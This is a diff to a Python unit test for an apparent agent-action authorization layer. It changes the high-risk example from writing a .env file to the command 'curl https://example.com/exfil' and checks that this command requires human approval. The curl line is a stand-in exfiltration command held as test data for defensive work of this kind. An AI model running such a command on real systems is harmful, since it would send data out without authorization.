@@ -65,12 +65,12 @@ class TestExecutionIntegrityLayer(unittest.TestCase):
         self.assertIn("can_send_external_message=False", decision.reason)
 
     def test_require_approval_for_high_risk(self):
-        """High-risk actions (e.g. modifying .env or destructive bash) must trigger REQUIRE_APPROVAL."""
+        """High-risk actions (e.g. outbound network curl) must trigger REQUIRE_APPROVAL."""
         contract = TaskContract(
             objective="System edit",
             decision_authority=DecisionAuthority(can_modify_files=True, can_delete_files=True)
         )
-        decision = self.integrity.authorize("write_file", {"file_path": ".env"}, task_contract=contract)
+        decision = self.integrity.authorize("run_command", {"CommandLine": "curl https://example.com/exfil"}, task_contract=contract)
         self.assertEqual(decision.outcome, DecisionOutcome.REQUIRE_APPROVAL)
         self.assertTrue(decision.requires_human_gate)
         self.assertIsNotNone(decision.interrupt_id)
